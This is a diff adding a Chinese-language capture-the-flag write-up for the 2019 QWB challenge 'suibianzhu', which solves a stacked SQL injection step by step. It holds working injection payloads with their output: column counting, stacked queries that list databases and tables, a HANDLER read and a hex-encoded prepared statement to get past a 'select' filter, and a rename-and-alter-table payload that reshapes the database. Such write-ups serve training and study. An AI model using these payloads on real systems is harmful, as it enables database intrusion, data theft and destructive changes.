@@ -996,6 +996,199 @@ var
 
 ------
 
+### [强网杯 2019]随便注
+
+打开靶机后看到题目描述：
+
+> 取材于某次真实环境渗透，只说一句话：开发和安全缺一不可
+
+`1' or 1=1 #`初步判定存在SQL注入。
+
+```php
+array(2) {
+  [0]=>
+  string(1) "1"
+  [1]=>
+  string(7) "hahahah"
+}
+
+array(2) {
+  [0]=>
+  string(1) "2"
+  [1]=>
+  string(12) "miaomiaomiao"
+}
+
+array(2) {
+  [0]=>
+  string(6) "114514"
+  [1]=>
+  string(2) "ys"
+}
+```
+
+`1' order by 1 #`测试字段数，到`3`时报错，说明字段数为`2`。
+
+```bash
+1' order by 3 #
+error 1054 : Unknown column '3' in 'order clause'
+```
+
+通过`;`号堆叠注入多条SQL语句。`1'; show databases; #`查看数据库：
+
+```php
+array(2) {
+  [0]=>
+  string(1) "1"
+  [1]=>
+  string(7) "hahahah"
+}
+
+array(1) {
+  [0]=>
+  string(11) "ctftraining"
+}
+
+array(1) {
+  [0]=>
+  string(18) "information_schema"
+}
+
+array(1) {
+  [0]=>
+  string(5) "mysql"
+}
+
+array(1) {
+  [0]=>
+  string(18) "performance_schema"
+}
+
+array(1) {
+  [0]=>
+  string(9) "supersqli"
+}
+
+array(1) {
+  [0]=>
+  string(4) "test"
+}
+```
+
+`1'; show tables; #`查看当前数据库中所有表的名称：
+
+```php
+array(2) {
+  [0]=>
+  string(1) "1"
+  [1]=>
+  string(7) "hahahah"
+}
+
+array(1) {
+  [0]=>
+  string(16) "1919810931114514"
+}
+
+array(1) {
+  [0]=>
+  string(5) "words"
+}
+```
+
+`1'; show columns from words; #`当表名为数字时，要用反引号把表名包起来查询，发现`flag`字段。
+
+```php
+1'; show columns from `1919810931114514`; #
+
+array(2) {
+  [0]=>
+  string(1) "1"
+  [1]=>
+  string(7) "hahahah"
+}
+
+array(6) {
+  [0]=>
+  string(4) "flag"
+  [1]=>
+  string(12) "varchar(100)"
+  [2]=>
+  string(2) "NO"
+  [3]=>
+  string(0) ""
+  [4]=>
+  NULL
+  [5]=>
+  string(0) ""
+}
+```
+
+`select`字段被过滤啦，可以使用`handler`来读取`1919810931114514`字段中的数据，得到`flag`。
+
+```sql
+1'; handler `1919810931114514` open as `a`; handler `a` read next;#
+
+array(2) {
+  [0]=>
+  string(1) "1"
+  [1]=>
+  string(7) "hahahah"
+}
+
+array(1) {
+  [0]=>
+  string(42) "flag{9f29b114-59f6-4548-bd9e-4e4f50ba67ae}"
+}
+```
+
+或者可以先将`select`语句进行十六进制编码，再通过构造`payload`进而得到`flag`。
+
+```python
+>>> "select * from `1919810931114514`".encode().hex()
+'73656c656374202a2066726f6d20603139313938313039333131313435313460'
+```
+
+- `SELECT`可以在一条语句里对多个变量同时赋值,而`SET`只能一次对一个变量赋值。
+- `prepare…from…`是预处理语句，会进行编码转换。
+- `execute`用来执行由`SQLPrepare`创建的SQL语句。
+
+```php
+1';SET@a=0x73656c656374202a2066726f6d20603139313938313039333131313435313460;prepare execsql from @a;execute execsql;#
+
+array(2) {
+  [0]=>
+  string(1) "1"
+  [1]=>
+  string(7) "hahahah"
+}
+
+array(1) {
+  [0]=>
+  string(42) "flag{9f29b114-59f6-4548-bd9e-4e4f50ba67ae}"
+}
+```
+
+此外还有第三种解法：
+
+- 先通过 `rename` 把 `words` 表改名为其他的表名。
+- 把`1919810931114514`表的名字改为`words`。
+- 给新`words`表添加新的唯一标识列名`id` 。**auto_increment**自动赋值，默认从1开始。
+- 将`flag`改名为`data` 。
+
+```php
+1'; rename table words to word1; rename table `1919810931114514` to words;alter table words add id int unsigned not Null auto_increment primary key; alter table words change flag data varchar(100);#
+
+array(2) {
+  [0]=>
+  string(42) "flag{9f29b114-59f6-4548-bd9e-4e4f50ba67ae}"
+  [1]=>
+  string(1) "1"
+}
+```
+
+------
+
 
 
 ------
